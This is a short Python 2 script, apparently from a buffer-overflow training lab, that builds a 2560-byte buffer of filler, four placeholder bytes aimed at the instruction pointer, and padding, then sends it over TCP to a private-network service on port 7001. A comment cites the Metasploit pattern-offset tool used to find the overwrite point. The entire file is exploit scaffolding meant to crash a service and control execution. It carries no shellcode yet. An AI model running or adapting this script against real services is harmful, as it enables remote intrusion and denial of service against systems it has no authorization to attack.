#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  #  msf-pattern_offset -l 2560 -q 33794332
  filler    = "A" * 2288
  eip       = "B" * 4
  buffer    = "C" * (2560 - len(filler) - len(eip))

  inputBuffer = filler + eip + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"

